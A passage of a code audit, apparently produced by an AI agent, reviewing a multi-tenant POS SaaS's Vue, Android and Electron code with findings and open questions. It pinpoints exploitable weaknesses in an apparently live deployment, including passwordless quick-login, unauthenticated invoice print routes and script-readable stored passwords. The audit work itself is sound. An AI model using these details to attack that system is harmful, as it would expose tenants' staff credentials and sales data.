- **Recommendation:** Use a short-lived one-time code exchanged by POST, or a central web session login. Restrict access to the super_admin role only.

### 60. [MEDIUM] Android biometric login stores the plaintext password, in a single global slot reachable from remote web content
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useBiometricAuth.js:47`
- **Effort:** M
- **Evidence:** setCredentials({server:'erp_secure_vault', username, password}) stores the raw password. The plugin uses the Android Keystore, which is good. But the biometric check is a separate verifyIdentity() call (l.80), and getCredentials (l.88) is not bound to it. Because the WebView loads a remote URL (capacitor server.url), any script on that origin can call NativeBiometric.getCredentials directly. The slot key is fixed and not per tenant or host, and the username lives in localStorage (erp_biometric_user).
- **Impact:** An XSS on the tenant site can exfiltrate cashier and manager passwords without any fingerprint prompt. After a workspace switch, tenant A's password is sent to tenant B's login.
- **Recommendation:** Store a revocable device-bound token (a dedicated Sanctum token with limited abilities) instead of the password. Key the slot by tenant id. Use the plugin's biometric-bound/secure credential API if one is available. Ship a strict CSP on the SPA.

### 61. [MEDIUM] Electron error page breaks on aborted navigations, and its Retry button cannot recover
- **Location:** `D:\projects\sroor\desktop\main.js:264`
- **Effort:** S
- **Evidence:** did-fail-load replaces the window with a data: URL for any error. It does not filter errorCode -3 (ERR_ABORTED, common with SPA redirects or downloads) or isMainFrame. The retry button calls window.location.reload(), which reloads the data: page, not targetUrl. targetUrl is also interpolated into the HTML without escaping.
- **Impact:** After a transient network drop, the POS stays on the error screen until the app restarts. Harmless aborted subframe loads can also blank the POS.
- **Recommendation:** Ignore errorCode -3 and non-main-frame loads. Make retry call mainWindow.loadURL(targetUrl) through a dedicated IPC or a loadFile page with a query param. Escape the URL.

### 62. [MEDIUM] Outdated Electron 33 on a shell that loads remote content
- **Location:** `D:\projects\sroor\desktop\package.json:24`
- **Effort:** S
- **Evidence:** devDependencies electron ^33.2.1, with 33.4.11 locked in package-lock.json. Electron only supports the latest 3 majors, so 33 (from late 2024) no longer gets Chromium security fixes by 2026-10. The app loads arbitrary tenant web content.
- **Impact:** Known Chromium renderer CVEs stay unpatched on every POS PC, which makes the RCE chain above easier to reach.
- **Recommendation:** Upgrade to a supported Electron major. Set sandbox:true explicitly in webPreferences. Pin it in CI.

### 63. [MEDIUM] No offline/queue capability in the device shells
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useNativeBridge.js:20`
- **Effort:** XL
- **Evidence:** Both shells are thin remote-URL wrappers: Capacitor server.url and Electron loadURL. useNativeBridge only tracks Network status, and it adds a Network listener on every mount without ever removing it. I found no IndexedDB/local sale queue.
- **Impact:** A shop's POS stops completely when the internet drops, which matters a lot for a sellable retail SaaS.
- **Recommendation:** Treat this as a product decision. At minimum, bundle the SPA shell locally and add an offline sale queue with server-side idempotency keys. Remove the listener in onUnmounted.

### 64. [LOW] Super-admin vs tenant route separation is one-directional
- **Location:** `D:\projects\sroor\backend\resources\js\router\index.js:455`
- **Effort:** S
- **Evidence:** Tenant users are kept out of /super-admin by meta.superAdminOnly. A super admin, however, can navigate to any tenant route (/pos, /invoices...) because there is no tenantOnly meta, and hasPermission returns true for the super_admin role (auth.js:159). The catch-all (line 397) silently redirects unknown URLs to '/', with no 404 view.
- **Impact:** A central super admin can open the tenant shell on the central host, where tenant APIs run against the central DB or fail confusingly. Mistyped or removed URLs give no feedback.
- **Recommendation:** Add meta.tenantOnly (or a default) and redirect super admins without tenant context to /super-admin. Add a lightweight NotFound view using EmptyState.

### 65. [LOW] 403 handler and 28 other files use Swal directly with hardcoded colors, bypassing helpers/alert.js
- **Location:** `D:\projects\sroor\backend\resources\js\Services\api.js:77`
- **Effort:** M
- **Evidence:** api.js:77-85 calls Swal.fire with confirmButtonColor '#f59e0b' and background/color hex values. 28 files besides helpers/alert.js import sweetalert2 directly (189 Swal.fire calls), e.g. SpaLayout.vue:668-676 with hardcoded Arabic text and '#e11d48'. Every 403 opens a blocking modal, so a dashboard that fires several forbidden requests stacks or replaces modals.
- **Impact:** Inconsistent theming (ignores --color-primary), hardcoded Arabic in logout confirm, and modal spam on permission-restricted screens.
- **Recommendation:** Route the 403 path through helpers/alert.js (a toast, de-duplicated per message) and migrate direct Swal usages to the helper incrementally.

### 66. [LOW] English locale is effectively unreachable; RTL and Arabic text are hardcoded in plumbing
- **Location:** `D:\projects\sroor\backend\resources\js\App.vue:2`
- **Effort:** M
- **Evidence:** The App.vue root has dir="rtl" (27 .vue files hardcode dir="rtl"). Nothing sets document.documentElement.lang/dir. fetchTranslations is only called with 'ar' (LoginView.vue). No language switcher writes app_locale. Server-provided data.locale is not persisted. The $t global (app.js:168) is a non-reactive function over window.spaTranslations, which is set only in the router guard (router/index.js:424) and not after login. Router meta.title values, the tabs store titles ('لوحة التحكم', 'شاشة'), and auth getters ('مستخدم', 'الفرع الرئيسي') are hardcoded Arabic.
- **Impact:** The 'ar and en' requirement cannot be met. Tab and document titles stay Arabic for English users.
- **Recommendation:** Add a setLocale action that persists app_locale, sets html lang/dir, refreshes window.spaTranslations and forces a re-render. Replace meta.title strings with translation keys resolved via trans(). Bind dir on the App root to the locale.

### 67. [LOW] Initial bundle ships both full translation dictionaries in the shared api chunk
- **Location:** `D:\projects\sroor\backend\resources\js\helpers\trans.js:1`
- **Effort:** S
- **Evidence:** A scratch `vite build` (output to the scratchpad, exit 0, in sync with the committed public/build hashes) shows api-*.js 497.38 kB / 148.83 kB gzip, just under Vite's 500 kB warning. It contains defaultTranslations.js (374 KB source, ar+en) plus sweetalert2 and axios. app-*.js is 206.9 kB / 60.3 kB gz and app.css 240.9 kB / 29.7 kB gz. The largest view is PosView 103.7 kB. The server also returns translations in /system/context, so they are downloaded twice. The build reports an INEFFECTIVE_DYNAMIC_IMPORT warning for stores/auth.js, dynamically imported in appConfig.js:56/61 while statically imported elsewhere. All 39 route components are lazy import()s.
- **Impact:** About 240 kB gzip is needed before first paint on low-end Android POS devices and the Capacitor webview, which slows cold start.
- **Recommendation:** Lazy-load only the active locale's fallback (dynamic import per locale), or rely on the server payload with a small embedded core set. Replace the dynamic import of auth in appConfig with a static one.

### 68. [LOW] Global plumbing gaps: no app.config.errorHandler, window.spaRouter global, duplicate update composables
- **Location:** `D:\projects\sroor\backend\resources\js\app.js:18`
- **Effort:** S
- **Evidence:** app.js sets window.spaRouter = router (used by api.js:67) and registers no app.config.errorHandler or unhandledrejection listener. The CapacitorApp.addListener try/catch (app.js:23-36) cannot catch the async rejection. Composables/useAppUpdater.js (78 lines) is used only by Components/Common/AppUpdateModal.vue, which is imported nowhere. App.vue uses Components/AppUpdateModal.vue with useAppUpdate.js (284 lines). tabs.cachedViews is computed but no <KeepAlive> exists anywhere.
- **Impact:** Runtime errors in views are not captured or reported. The global router invites coupling. Dead duplicates confuse maintenance.
- **Recommendation:** Add app.config.errorHandler plus a window unhandledrejection handler that logs and shows a translated toast. Pass the router to api.js via an injected setter instead of window. Delete useAppUpdater.js, Common/AppUpdateModal.vue and the unused cachedViews, or wire KeepAlive deliberately.

### 69. [LOW] Workspace onboarding and central login hardcode the production host and leave tenant_id during central login
- **Location:** `D:\projects\sroor\backend\resources\js\views\Auth\LoginView.vue:360`
- **Effort:** S
- **Evidence:** isCentralHub compares hostname to a hardcoded production domain (LoginView.vue ~360, WorkspaceConnectView.vue ~84), and switchWorkspace hardcodes the same URL for Electron. Only WorkspaceConnectView writes tenant_id/active_tenant/tenant_*. The 401 handler and clearSession keep tenant_id (fine for re-login in the same workspace). But the ?central=1 'central login' path does not remove tenant_id, so api.js still sends X-Tenant and the central admin login is resolved inside the remembered tenant DB. Biometric credentials use a fixed vault key ('erp_secure_vault', useBiometricAuth.js:10) that is not scoped per tenant.
- **Impact:** White-label or self-hosted deployments break. A central admin on a device that previously connected to a workspace cannot log in centrally without clearing storage. Biometric login replays one workspace's credentials against another.
- **Recommendation:** Move central domains to config (from /system/context or a Vite env). Skip the X-Tenant header when the route is central login. Scope the biometric vault key by tenant id.

### 70. [LOW] PosView.legacy.grid.vue (1452 lines) and other POS components are dead
- **Location:** `D:\projects\sroor\backend\resources\js\views\POS\PosView.legacy.grid.vue`
- **Effort:** S
- **Evidence:** The router only imports '../views/POS/PosView.vue' (router/index.js:210), and there is no import.meta.glob in resources/js. These components are also unreferenced: POSCategoryBar, POSCheckoutSummary, POSCustomerBar, POSCustomerPickerModal, POSQuickCustomerModal, POSItemCard, POSCartItem, POSNumpad and POSWeightPickerModal. POSQuickPinnedItems is imported in PosView but never rendered, and `quickPinnedItems` is unused.
- **Impact:** This breaks the no-legacy-copies rule, about 2,500 lines are dead, and grep results and reviewers are misled. The dead components hold the only weight UI.
- **Recommendation:** Delete the legacy file and the unused components (salvage the weight picker first, see the weight finding). Remove the unused import.

### 71. [LOW] Responsive layout at 768 px puts the catalog above the cart and checkout
- **Location:** `D:\projects\sroor\backend\resources\js\views\POS\PosView.vue:35`
- **Effort:** M
- **Evidence:** Below `lg` (1024px) the workspace is `flex-col overflow-y-auto`, the catalog `<main>` is `order-1 min-h-[300px]` and the cart section is `order-2 min-h-[380px]`, with the category sidebar `order-3` stacked last. POSHeader hides some labels with `hidden sm:inline-flex`. I did not check this visually.
- **Impact:** On a portrait tablet or phone, the cashier has to scroll past the product grid to reach the cart and Confirm, and the categories end up below the checkout.
- **Recommendation:** Below lg, use a tabbed or bottom-sheet layout (Cart | Products) with a sticky checkout bar, and test at 360/768/1024.

### 72. [LOW] Persisted carts are keyed by tenant only, not by user or store, and survive logout and store switch
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\usePosOrders.js:8`
- **Effort:** S
- **Evidence:** The key is `pos_multi_orders_${active_tenant||tenant_id||'central'}`. The api.js 401 handler does not clear it or tenant_id. handleSwitchStore reloads items but keeps cart lines priced for the previous store.
- **Impact:** On a shared counter device, the next cashier inherits the previous cashier's open orders. After a store switch, a sale can be submitted for store B at store A prices and quantities.
- **Recommendation:** Include the user id and store id in the key, clear it on logout and on tenant change, and warn or re-price the cart on store switch.

### 73. [LOW] Hardcoded user-facing text and currency in POS
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\usePosOrders.js:17`
- **Effort:** S
- **Evidence:** Examples: `title: `طلب #${orderNumber}`` (usePosOrders). In PosView, `${formatMoney(subtotal)} ج.م` (L579), the thermal HTML Arabic strings, and the `'1.0.10'` fallback. POSCheckoutPanel has `placeholder="المدفوع نقداً..."`, and POSCartTable has the `item.unit || 'قطعة'` fallback. Emoji are used as icons (🛒, 🏷️, 🏪, 💳). PosView uses Swal directly with `confirmButtonColor: '#e11d48'` instead of helpers/alert.js.
- **Impact:** English tenants see Arabic, and non-EGP tenants see ج.م. This violates the localization and icon rules.
- **Recommendation:** Move these strings to lang/ar and lang/en `pos.*` keys, take the currency from appConfig, use lucide icons, and use helpers/alert.js.

### 74. [LOW] api.js keeps tenant_id after a 401, and the 403 handler bypasses helpers/alert.js
- **Location:** `D:\projects\sroor\backend\resources\js\Services\api.js:58`
- **Effort:** S
- **Evidence:** Line 31 reads localStorage 'tenant_id' and line 33 sends it as X-Tenant. The 401 branch (lines 59-62) removes auth_token, auth_user, auth_store and current_store_id, but not tenant_id. LoginView also keeps 'tenant_users' cached. The 403 branch (line 77) calls Swal.fire directly. 28 files import sweetalert2 directly, while only 7 use helpers/alert.js.
- **Impact:** After a session expires on a shared device, the next login goes to the previous tenant, and the cached user list of that tenant stays readable in localStorage. Dialog styling and dark mode differ from screen to screen.
- **Recommendation:** Make tenant persistence an explicit 'remember workspace' choice and clear tenant_users on 401 and logout. Route all confirms and toasts through helpers/alert.js.

### 75. [LOW] Dark-mode gaps and hardcoded hex colors (minor)
- **Location:** `D:\projects\sroor\backend\resources\js\Components\Settings\SettingsPrintingSection.vue:1`
- **Effort:** S
- **Evidence:** Dark-mode coverage is mostly good: only about 15 bg-white lines lack a dark:bg variant (SettingsPrintingSection 4, plus single lines in SettingsTelegramSection, SettingsNavigationSidebar, SettingsAppearanceSection, BaseSwitch, BaseButton, SimpleBarChart, DashboardAppMenuHub). Hex colors: BaseDatePicker.vue has 47 hex values in !important CSS overrides, root DatePicker 27, ThemeTab 21 (dead). SpaLayout and DesktopSidebar use var(--color-primary, #f59e0b) with an amber fallback (the legacy coffee brand). Swal confirmButtonColor '#f43f5e' and '#e11d48' are hardcoded in InvoicesView, useReturns and SpaLayout:675. Coffee wording remains in 18 JS/Vue files and in lang dashboard.php, inventory.php and nav.php.
- **Impact:** Small visual inconsistencies in dark mode, and leftover coffee branding for non-coffee tenants.
- **Recommendation:** Add dark: variants in Settings sections, move the date-picker colors to CSS variables, and drop the amber fallback. Track the coffee-to-generic renaming (CoffeeBlender to a generic recipe/blend module) as its own task.

### 76. [LOW] Super-admin and auth UI contain hardcoded Arabic text and raw Swal colors
- **Location:** `D:\projects\sroor\backend\resources\js\Layouts\SuperAdminLayout.vue:40`
- **Effort:** M
- **Evidence:** SuperAdminLayout:40, 42 and 221 contain literals ('وحدات القياس', 'مراقب النظام (Telescope)', 'إصدار المنصة'). Arabic literals also appear in UploadApkModal (9), SuperAdminServerSpecsCard (6) and others. LoginView:9, 13, 35 and 38 have hardcoded titles. Router meta titles are hardcoded Arabic. WorkspaceConnectView and LoginView are hardcoded dir="rtl". The controller returns the literal 'تم حفظ وتحديث وحدات القياس...' and uses `__() ?: 'literal'` fallbacks. api.js uses the 403 Swal with hex colors, and useSuperAdminTenantShow uses confirmButtonColor '#e11d48' instead of helpers/alert.js and useDeleteHandler. Skeleton loaders are missing in Units, Plans dashboard cards and the tenant show sub-cards (only some components have skeletons).
- **Impact:** The English locale shows Arabic. The layout is wrong in en (LTR). The brand color is inconsistent in dark and light themes.
- **Recommendation:** Move the strings into lang/{ar,en}/super.php and auth.php. Bind dir from the locale. Route confirmations through helpers/alert.js.

### 77. [LOW] Logout and 401 keep workspace data (tenant_id, cached staff list) on shared devices
- **Location:** `D:\projects\sroor\backend\resources\js\Services\api.js:58`
- **Effort:** S
- **Evidence:** The 401 handler removes auth_token, auth_user, auth_store and current_store_id, but keeps tenant_id and tenant_users (the full staff list with phones from workspace-users).
- **Impact:** Keeping the workspace is arguably intended for POS devices. But the cached staff PII persists on the device, and stale X-Tenant feeds the super-admin issue above.
- **Recommendation:** Keep active_tenant for convenience, but stop caching tenant_users (or remove it with the endpoint). Clear tenant keys on explicit 'switch workspace' or central login.

### 78. [LOW] Preload exposes printPdf, but main has no 'hardware:print-pdf' handler
- **Location:** `D:\projects\sroor\desktop\preload.js:24`
- **Effort:** S
- **Evidence:** preload.js l.24 calls ipcRenderer.invoke('hardware:print-pdf'). Searching main.js finds no ipcMain.handle for that channel.
- **Impact:** Any caller gets a rejected promise ('No handler registered').
- **Recommendation:** Implement it or remove it from the bridge.

### 79. [LOW] Duplicate, dead updater composable calls an endpoint that does not exist
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useAppUpdater.js:22`
- **Effort:** S
- **Evidence:** It calls '/app/check-version'. routes/api.php only defines /app/version and /app/check-update. The version is hardcoded to 1.0.0/1 and window.open(url,'_system') is used. Its only consumer, Components/Common/AppUpdateModal.vue, is never imported. App.vue imports Components/AppUpdateModal.vue.
- **Impact:** Confusion and dead code, against the no-legacy-copies rule.
- **Recommendation:** Delete useAppUpdater.js and Components/Common/AppUpdateModal.vue.

### 80. [LOW] Update and biometric composables hardcode Arabic text and Swal colors
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useAppUpdate.js:84`
- **Effort:** S
- **Evidence:** Swal.fire with Arabic literals and confirmButtonColor '#f59e0b'/'#10b981' (l.84-90, l.130-136, l.141-146), plus downloadStageText (l.155-158). useBiometricAuth.js has Arabic literals at l.40-44, l.60-66 and l.121-127. AppUpdateController also returns Arabic 'title'/'message'.
- **Impact:** English UI shows Arabic. The code bypasses helpers/alert.js theming and breaks dark/light consistency.
- **Recommendation:** Move the strings to lang/ar and lang/en under app_update.* and auth.biometric.*, and use helpers/alert.js.

### 81. [LOW] Android manifest/config hardening gaps
- **Location:** `D:\projects\sroor\backend\android\app\src\main\AndroidManifest.xml:5`
- **Effort:** S
- **Evidence:** android:allowBackup="true", which can include the WebView localStorage holding the bearer token. capacitor.config.json sets cleartext:true even though the host is https. res/xml/config.xml has <access origin="*"/>. file_paths.xml exposes external-path '.'. The release buildType has minifyEnabled false and no signingConfigs; the signing process is undocumented, though no keystore or password was found in the repo. The DownloadListener installs any download whose URL contains 'download-apk' (MainActivity l.35-39), and the DOWNLOAD_COMPLETE receiver is registered RECEIVER_EXPORTED. BLUETOOTH_* permissions are declared, but no Bluetooth plugin exists: useNativeBridge relies on window.BluetoothPrinter, which is never defined.
- **Impact:** Token exposure through backups and wider attack surface. Play Store reviewers will question the unused permissions.
- **Recommendation:** Set allowBackup=false or add dataExtractionRules excluding app_webview. Set cleartext false. Narrow file_paths. Restrict the APK download to the configured update origin. Drop unused BT permissions until a real ESC/POS Bluetooth plugin ships. Add a documented signing config read from env.

### 82. [INFO] Little debug output left; no Options API, Inertia, Livewire or Alpine leftovers
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useSettings.js:176`
- **Effort:** S
- **Evidence:** grep finds 0 'export default {' or data() in .vue files and 0 inertia, livewire, x-data, alpine or wire: references in resources/js. There is exactly 1 console.log (useSettings.js:176) and about 40 console.error/warn calls, mostly in composables used as the only error handling. No commented-out template blocks were found. The only *.legacy.* file is views/POS/PosView.legacy.grid.vue.
- **Impact:** Low. The console.error-only catches are the real problem, covered in the error-state finding.
- **Recommendation:** Remove the console.log and the legacy POS file. Replace the console.error catches with an error state.

### 83. [INFO] Desktop context menu exposes DevTools to every user; build artifacts and log on disk
- **Location:** `D:\projects\sroor\desktop\main.js:225`
- **Effort:** S
- **Evidence:** The context menu has 'DevTools' → toggleDevTools(), with no dev-mode check. desktop/dist (Setup-1.0.0.exe, win-unpacked) and electron_debug.log exist locally but are gitignored (.gitignore l.99, l.103), so they are not committed. DownloadLatestApkAction l.82 falls back to serving base_path('../desktop/dist/Sroor-ERP-POS-Setup-1.0.0.exe') and coffee-named APKs.
- **Impact:** Cashiers can open DevTools and read the bearer token. The server may serve a stale dev-built installer.
- **Recommendation:** Only show DevTools when app.isPackaged is false or behind an admin flag. Remove the filesystem fallbacks in DownloadLatestApkAction.

## Open questions
- Is quick-login (passwordless) meant to be restricted to registered POS devices? Nothing in the code restricts it today. It needs a product decision before any public launch.
- Does the stancl Tenant model in this repo keep the default CentralConnection? I assumed yes (BaseTenant) for the super-admin escalation path but did not confirm in vendor.
- Should the remembered tenant_id survive a 401 or logout on shared devices? It currently does by design. Confirm the intended UX for devices shared between workspaces.
- Are tenant web routes /invoices/{id}/print, /print/thermal and /print/a4 (routes/tenant.php ~55-74) intentionally outside the auth group? They render any invoice by sequential id without authentication on the tenant domain. This is out of my sub-area; flagging for the backend lead.
- Is there any plan to build assets in CI (Linux)? If so, the 'services' vs 'Services' casing must be fixed first.
- I did no visual or browser verification. All findings come from static reading plus one scratch build whose output went to the scratchpad.
- Is a 'partial' payment ever intended to be entered via the multi-payment modal only? If so, the cash-received input should be hidden in partial mode. Either way the current payload is wrong.
- Should POS use POST /pos/invoices (POSController, StorePOSInvoiceRequest) or POST /invoices? Both exist, with different FormRequests. The SPA currently uses /api/v1/invoices with StoreSalesInvoiceRequest.
- Which receipt should be canonical: the server Blade print-thermal (tenant settings, QR) or the SPA InvoicePrintView? The POS web fallback currently opens the Blade one through an unauthenticated route.
- Is a weighted-item flag or barcode column planned on items? The backend currently infers 'discrete' units from a hardcoded Arabic unit list in InvoiceService, which will not work for non-Arabic or custom units.
- Is offline selling a product requirement for v1 of the SaaS, or is 'online-only with a clear offline banner' acceptable?
- I did not check anything visually (no dev server or browser was run). The 768/1024 behaviour, dark mode and console warnings are inferred from the code only.
- Does the backend enforce plan or feature limits per tenant (middleware or policy)? The frontend has no tenant-aware gating, so plans can only be sold as tiers if the server enforces them.
- On the central (non-tenant) host, does a central users table contain super-admin accounts that /auth/workspace-users plus /auth/quick-login would expose? This decides whether the passwordless-login hole reaches the super-admin panel as well as every tenant.
- Do the DELETE /returns/{id} and DELETE /items, /stores or /categories endpoints soft-delete or archive (the UI says 'archive' for returns)? I did not check this in the backend.
- Is POSWeightPickerModal (unused) supposed to be the by-kilo entry point? If so, how does the current PosView handle weight items? This belongs to the POS sub-area.
- Nothing was checked visually (no dev server or browser in this read-only run). I did not run npm run build, so the Linux casing failure is inferred from the file layout, not reproduced.
- Confirming the user's question: this analysis ran on the checked-out branch feature/multi-tenant (the SaaS branch). Nothing was edited, committed or switched.
- Is quick-login (passwordless) live in production on 2m.baraa-solutions.com and the central host? If so, the critical findings need immediate rotation of all tokens after the fix.
- Are the central-DB super-admin users the only intended platform operators? Should tenant-DB 'admin' role holders ever reach Telescope or super-admin endpoints?
- Out of scope but worth checking: routes/web.php /invoices/{id}/print/thermal and /print/a4 have no auth middleware and use sequential ids. Which DB do they read in central context?
- Should the coffee blender become a 'product assembly / recipes' module available to all verticals, or be removed from the generic product?
- What renewal model is planned (manual bank transfer vs payment gateway)? It decides the shape of the subscriptions and payments API needed from backend-architect.
- Is the intended mobile model one generic APK with workspace connect (which needs a central server.url or a bundled SPA and the ResolveApiTenancy fix), or a white-label APK per tenant? The current config fits neither cleanly.
- Where are the Android release keystore and the Windows code-signing certificate kept, and who signs the builds? Neither is configured in the repo.
- Should web, Android and Windows share one version numbering? Today they use three unrelated schemes: web build_number 135, Android versionCode 3, desktop package 1.0.0. useSuperAdminAppVersions also computes the next version_code across all platforms combined.
- Does the capgo native-biometric version in use offer a biometric-bound getCredentials? If not, the password stays readable by any script on the remote origin.
- Is offline selling a product requirement for the retail/kilo POS target? It decides whether the shells must bundle the SPA.